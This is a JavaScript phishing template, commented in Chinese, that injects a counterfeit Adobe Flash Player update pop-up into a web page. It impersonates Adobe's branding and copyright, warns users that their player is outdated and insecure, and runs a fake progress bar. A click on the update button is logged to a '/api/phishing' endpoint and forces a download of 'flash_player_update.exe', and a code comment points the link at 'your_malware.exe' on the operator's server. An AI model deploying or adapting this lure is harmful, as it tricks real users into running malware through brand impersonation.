// Flash更新钓鱼模板
// 在页面上插入一个仿冒的Flash更新提示

// 创建样式
const style = document.createElement('style');
style.textContent = `
.flash-update-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.7);
  z-index: 9999;
  display: flex;
  justify-content: center;
  align-items: center;
}

.flash-update-container {
  width: 500px;
  background-color: #f8f8f8;
  border-radius: 8px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  overflow: hidden;
}

.flash-update-header {
  background-color: #fa0000;
  color: white;
  padding: 15px 20px;
  display: flex;
  align-items: center;
}

.flash-update-logo {
  width: 32px;
  height: 32px;
  margin-right: 15px;
}

.flash-update-title {
  font-size: 18px;
  font-weight: bold;
}

.flash-update-content {
  padding: 20px;
}

.flash-update-message {
  margin-bottom: 20px;
  line-height: 1.5;
  color: #333;
}

.flash-update-warning {
  background-color: #fff8e1;
  border-left: 4px solid #ffc107;
  padding: 10px 15px;
  margin-bottom: 20px;
  font-size: 14px;
  color: #856404;
}

.flash-update-progress {
  height: 10px;
  background-color: #e0e0e0;
  border-radius: 5px;
  margin-bottom: 20px;
  overflow: hidden;
}

.flash-update-progress-bar {
  height: 100%;
  background-color: #fa0000;
  width: 0%;
  transition: width 0.5s ease;
}

.flash-update-buttons {
  display: flex;
  justify-content: space-between;
}

.flash-update-button {
  padding: 10px 20px;
  border-radius: 4px;
  font-weight: bold;
  cursor: pointer;
  text-align: center;
  transition: all 0.2s ease;
}

.flash-update-primary {
  background-color: #fa0000;
  color: white;
  border: none;
  flex-grow: 1;
  margin-right: 10px;
}

.flash-update-primary:hover {
  background-color: #d10000;
}

.flash-update-secondary {
  background-color: transparent;
  color: #666;
  border: 1px solid #ccc;
  flex-grow: 0;
}

.flash-update-secondary:hover {
  background-color: #f0f0f0;
}

.flash-update-footer {
  padding: 10px 20px;
  background-color: #f0f0f0;
  border-top: 1px solid #e0e0e0;
  font-size: 12px;
  color: #666;
  text-align: center;
}

.flash-update-close {
  position: absolute;
  top: 10px;
  right: 10px;
  background: none;
  border: none;
  color: white;
  font-size: 24px;
  cursor: pointer;
}
`;

// 创建Flash更新弹窗
function createFlashUpdate() {
  const overlay = document.createElement('div');
  overlay.className = 'flash-update-overlay';
  
  const container = document.createElement('div');
  container.className = 'flash-update-container';
  
  // 关闭按钮
  const closeButton = document.createElement('button');
  closeButton.className = 'flash-update-close';
  closeButton.innerHTML = '&times;';
  closeButton.onclick = function() {
    document.body.removeChild(overlay);
  };
  
  // 头部
  const header = document.createElement('div');
  header.className = 'flash-update-header';
  
  const logo = document.createElement('img');
  logo.className = 'flash-update-logo';
  logo.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAFHGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDUgNzkuMTYzNDk5LCAyMDE4LzA4LzEzLTE2OjQwOjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOSAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIzLTA4LTI1VDExOjI1OjM3KzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMy0wOC0yNVQxMToyNjozMSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMy0wOC0yNVQxMToyNjozMSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3YzY4ZmI3ZS1hMzgwLTM5NDMtYmJlNy1hZDUzMGQ4NDg2ZDQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N2M2OGZiN2UtYTM4MC0zOTQzLWJiZTctYWQ1MzBkODQ4NmQ0IiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6N2M2OGZiN2UtYTM4MC0zOTQzLWJiZTctYWQ1MzBkODQ4NmQ0Ij4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0iY3JlYXRlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDo3YzY4ZmI3ZS1hMzgwLTM5NDMtYmJlNy1hZDUzMGQ4NDg2ZDQiIHN0RXZ0OndoZW49IjIwMjMtMDgtMjVUMTE6MjU6MzcrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE5IChXaW5kb3dzKSIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7wBDqXAAADDklEQVRYhe2XTUhUURTHf+/NjB+jqaNjWWqEFhFRixbRIiJoUbSLaBG0KGgVLYJatAiiRdCiRUSLaBFEi6BFtIhoEUEfVosoKqKIoiLLj3Gc8ePNnBZzx/dGZ+bdGaJF/eFy37v3nHPPf+459z4RVWUhw1iw7P8HLHgHIqoqIrIcOAA0AyPA9YUMXETWAKeAHcAQ8EBVXy6Ug7PAIeAb8BrYLiKbgTZVfZFWgIjUAKeB/cBH4DZwFdgKHAU6VHVP2g5cAA4DfcBdoAu4CewCjgGdqro3TQeagdPAPuADcAu4BmwDWoEOVd2XRoCIrALOAC3AR+AO0A5sBY4AHaq6P42AZuAUsBeIgFvADWAL0Ap0qOqBNAJWAmeB/cAA0A7cBjYBx4FOVT2YRsAu4DSwB+gH7gHXgY1AC3BRVQ+lEbAGOAccBPqAu8AVYANwAuhS1cNpBOwGzgK7gV7gPnAZWA+cBLpV9UgaAWuB88ABoAe4A1wC1gHHgW5VbU0jYA9wDtgJfAYeAheB1cApoEdVj6YRsA44D+wHvgL3gQvAKuAk8FRVj6URsBc4D+wAPgGPgPPASuAU8ExVj6cRsB64AOwDvgAPgHPACuAk8FxVT6QRsA+4COwAvgOPgbNAA3ACeKGqJ9MIaAIuAfuAQeAhcAaoB44DL1X1VBoB+4FLwHbgB/AEOAPUAceAV6p6Oo2ADcBloAX4CTwGTgO1wFHgtaqeSSOgBbgMbAOGgKfAKaAGOAK8UdUzaQRsBC4DzcAw8Aw4CYTAEeCdqp5NI2ATcAXYCowAz4ETQBVwGHivqufSCNgMXAG2AKPAC+A4UAkcAt6r6vk0ArYAV4HNwBjwEjgGVACHgA+qeiGNgK3ANWATEAOvgKNAOXAQ+KSqF9MI2AZcBzYC48Br4AhQBhwAPqvqpTQCtgM3gA3ABPAGOAyUAvuBL6p6OY2AHcBNYD0wCbwFDgElwD7gq6peTiNgJ3ATWAdMAu+Ag0AxsBeIVPVKGgG/AV/rjDqSSEoKAAAAAElFTkSuQmCC';
  
  const title = document.createElement('div');
  title.className = 'flash-update-title';
  title.textContent = 'Adobe Flash Player 更新';
  
  header.appendChild(logo);
  header.appendChild(title);
  
  // 内容
  const content = document.createElement('div');
  content.className = 'flash-update-content';
  
  const message = document.createElement('div');
  message.className = 'flash-update-message';
  message.innerHTML = '<strong>您的 Adobe Flash Player 版本已过期</strong><br>为了保证最佳浏览体验和安全性，请立即更新到最新版本。';
  
  const warning = document.createElement('div');
  warning.className = 'flash-update-warning';
  warning.textContent = '安全警告：过期的 Flash Player 版本可能会导致安全漏洞，使您的计算机面临风险。';
  
  const progress = document.createElement('div');
  progress.className = 'flash-update-progress';
  
  const progressBar = document.createElement('div');
  progressBar.className = 'flash-update-progress-bar';
  progress.appendChild(progressBar);
  
  const buttons = document.createElement('div');
  buttons.className = 'flash-update-buttons';
  
  const updateButton = document.createElement('button');
  updateButton.className = 'flash-update-button flash-update-primary';
  updateButton.textContent = '立即更新';
  updateButton.onclick = function() {
    // 模拟下载进度
    let width = 0;
    const interval = setInterval(function() {
      if (width >= 100) {
        clearInterval(interval);
        
        // 记录用户点击
        const clickData = {
          action: 'flash_update_click',
          url: window.location.href,
          title: document.title,
          timestamp: new Date().toISOString()
        };
        
        fetch('/api/phishing', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(clickData)
        });
        
        // 创建假的下载链接
        const link = document.createElement('a');
        //link.href = '/static/downloads/your_malware.exe'; // 指向您服务器上的文件
        link.href = 'data:application/octet-stream;base64,UEsDBBQAAAAIAJh3bVQAAAAAAgAAAAAAAAATAAAAZmxhc2hfcGxheWVyX3VwZGF0ZS5leGVQSwECFAAUAAAACACYd21UAAAAAAIAAAAAAAAAEwAAAAAAAAABACAAAAAAAAAAZmxhc2hfcGxheWVyX3VwZGF0ZS5leGVQSwUGAAAAAAEAAQBBAAAAQwAAAAAA';
        link.download = 'flash_player_update.exe';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // 移除更新弹窗
        document.body.removeChild(overlay);
      } else {
        width += 2;
        progressBar.style.width = width + '%';
      }
    }, 50);
  };
  
  const laterButton = document.createElement('button');
  laterButton.className = 'flash-update-button flash-update-secondary';
  laterButton.textContent = '稍后';
  laterButton.onclick = function() {
    document.body.removeChild(overlay);
  };
  
  buttons.appendChild(updateButton);
  buttons.appendChild(laterButton);
  
  content.appendChild(message);
  content.appendChild(warning);
  content.appendChild(progress);
  content.appendChild(buttons);
  
  // 页脚
  const footer = document.createElement('div');
  footer.className = 'flash-update-footer';
  footer.textContent = '© ' + new Date().getFullYear() + ' Adobe. 保留所有权利。';
  
  // 组装
  container.appendChild(closeButton);
  container.appendChild(header);
  container.appendChild(content);
  container.appendChild(footer);
  overlay.appendChild(container);
  
  return overlay;
}

// 添加样式到页面
document.head.appendChild(style);

// 显示Flash更新弹窗
const flashUpdate = createFlashUpdate();
document.body.appendChild(flashUpdate);

// 返回执行结果
return "Flash更新钓鱼已插入页面";